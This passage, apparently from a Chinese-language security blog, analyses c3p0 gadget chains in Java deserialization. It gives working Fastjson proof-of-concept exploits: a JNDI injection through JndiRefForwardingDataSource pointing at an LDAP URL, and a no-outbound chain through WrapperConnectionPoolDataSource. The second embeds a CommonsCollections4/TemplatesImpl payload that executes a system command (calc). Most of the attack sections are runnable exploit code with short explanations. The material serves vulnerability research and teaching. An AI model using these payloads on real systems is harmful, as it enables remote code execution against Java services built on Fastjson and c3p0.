            @Override
            public java.io.PrintWriter getLogWriter() throws SQLException {
                return null;
            }
            @Override
            public int getLoginTimeout() throws SQLException {
                return 0;
            }
            @Override
            public void setLogWriter(java.io.PrintWriter out) throws SQLException {
            }
            @Override
            public void setLoginTimeout(int seconds) throws SQLException {
            }
            @Override
            public Logger getParentLogger() throws SQLFeatureNotSupportedException {
                return null;
            }
        }
        public static void main(String[] args) throws Exception {
            PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
            ConnectionPoolDataSource connectionPoolDataSource1 = new NotSerializable();
            Field field = poolBackedDataSourceBase.getClass().getDeclaredField("connectionPoolDataSource");
            field.setAccessible(true);
            field.set(poolBackedDataSourceBase, connectionPoolDataSource1);
            String serializeData = serialize(poolBackedDataSourceBase);
            System.out.println(serializeData);
            unserialize(serializeData);
        }
    }
### 条件
需要tomcat8下的依赖
除了使用EL表达式也有其他利用
  *     org.apache.naming.factory.BeanFactory + groovy
  *     org.apache.naming.factory.BeanFactory + SnakeYaml
  *     org.apache.naming.factory.BeanFactory + XStream
## Fastjson中的JndiRefForwardingDataSource类利用
### 分析
在其中的`dereference`方法中存在一个lookup，如果这个`jndiName`可控就会导致JNDI注入
虽然在`JndiRefForwardingDataSource`类中，并没有对应的setter，但是这个类继承了`JndiRefDataSourceBase`类，在这个类中存在有setter方法
这样，这个`jndiName`就可以控制了
在`inner`方法中存在`dereference`的调用，寻找setter方法
这两个setter都调用了inner方法，但是因为`setLogWriter`的参数是`PrintWriter`对象，我们选择简单的int类型参数的`setLoginTimeout`方法
### 构建POC
    import com.alibaba.fastjson.JSON;
    public class c3p0_fastjson {
        public static void main(String[] args){
            String poc = "{\"@type\": \"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\n"+"\"jndiName\": \"ldap://127.0.0.1:1389/fvtvuj\",\n"+"\"loginTimeout\": 0}";
            JSON.parseObject(poc);
        }
    }
## Fastjson之WrapperConnectionPoolDataSource类不出网利用
### 分析
这里主要是使用的是`WrapperConnectionPoolDataSourece`类，跟进
这个类在初始化的时候，就调用了`setUpPropertyListeners`方法开启了属性监听功能
这里的`VetoableChangeListener`就是一个监听器，在属性改变的时候就会调用监听器的`VetoableChange`的方法，这里就创建了一个监听器，而且重写了`vetoableChange`方法
后面通过调用addVetoableChangeListener，将监听器添加到自己的属性`vcs`
那这个vcs属性又是什么呢，是`VetoableChangeSupport`，这个就是一个监听器的列表，并且会向监听器列表发送
`PropertyChangeEvent` ，来跟踪属性的更改情况。
在设置属性时，为了监控属性的变化，就会去调用`vcs.fireVetoableChange`
方法，此方法有很多重载，但最后都会封装一个`PropertyChangeEvent` 对象
传递给了监听器的`vetoableChange`方法
来看看重新的`vetoableChange`方法的逻辑
他只监听两个属性`connectionTesterClassName`和`userOverridesAsString`
第一个属性不能利用
第二个属性`userOverridesAsString`：
会调用`C3P0ImplUtils.parseUserOverridesAsString`处理新的属性值，跟进细节
截取了`HexAsciiSerializedMap`后的第二个字符到倒数第二个字符的hex串
之后通过调用`fromHexAscii`方法将hex转化为序列化字节，再通过调用了`SerializableUtils.fromByteArray`方法处理序列化字节
调用了`deserializeFromByteArray`进行反序列化，如果这里是一个恶意的字节码，就会进行恶意触发漏洞
所以现在我们就需要`userOverridesAsString`的setter方法，就会调用这个链子
在`WrapperConnectionPoolDataSource`类中是没有这个方法的，但是他继承了`WrapperConnectionPoolDataSourceBase`类
这个类具有对应的setter方法
### 编写POC
    import com.alibaba.fastjson.JSON;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InstantiateTransformer;
    import javax.xml.transform.Templates;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    public class c3p0_fastjson2 {
        public static Field getField (final Class clazz, final String fieldName ) throws Exception {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                if ( field != null )
                    field.setAccessible(true);
                else if ( clazz.getSuperclass() != null )
                    field = getField(clazz.getSuperclass(), fieldName);
                return field;
            }
            catch ( NoSuchFieldException e ) {
                if ( !clazz.getSuperclass().equals(Object.class) ) {
                    return getField(clazz.getSuperclass(), fieldName);
                }
                throw e;
            }
        }
        public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }
        public static PriorityQueue CommonsCollections4() throws Exception {
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass ctClass = pool.makeClass("c3p0Exploit");
            ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
            String shell = "java.lang.Runtime.getRuntime().exec(\"calc\");";
            ctClass.makeClassInitializer().insertBefore(shell);
            byte[] shellCode = ctClass.toBytecode();
            byte[][] targetCode = new byte[][]{shellCode};
            TemplatesImpl templatesImpl = new TemplatesImpl();
            setFieldValue(templatesImpl, "_name", "xx");
            setFieldValue(templatesImpl, "_bytecodes", targetCode);
            setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
            Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
            PriorityQueue priorityQueue = new PriorityQueue(2);
            priorityQueue.add(1);
            priorityQueue.add(2);
            Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
            field.setAccessible(true);
            field.set(priorityQueue, transformingComparator);
            return priorityQueue;
        }
        public static byte[] toByteArray(InputStream in) throws Exception {
            byte[] classBytes;
            classBytes = new byte[in.available()];
            in.read(classBytes);
            in.close();
            return classBytes;
        }
        public static String bytesToHexString(byte[] bArray, int length) {
            StringBuffer sb = new StringBuffer(length);
            for(int i = 0; i < length; ++i) {
                String sTemp = Integer.toHexString(255 & bArray[i]);
                if (sTemp.length() < 2) {
                    sb.append(0);
                }
                sb.append(sTemp.toUpperCase());
            }
            return sb.toString();
        }
        public static void main(String[] args) throws Exception {
            PriorityQueue queue = CommonsCollections4();
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);
            outputStream.writeObject(queue);
            outputStream.close();
            byte[] bytes = byteArrayOutputStream.toByteArray();
            //byte[] bytes = toByteArray(inputStream);
            String hexString = bytesToHexString(bytes, bytes.length);
            String poc = "{\n\t\"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\n\t\"userOverridesAsString\": \"HexAsciiSerializedMap:" + hexString + ";\"\n}";
            System.out.println(poc);
            JSON.parseObject(poc);
        }
    }
这里是使用了cc4版本jar包的cc4链出发计算器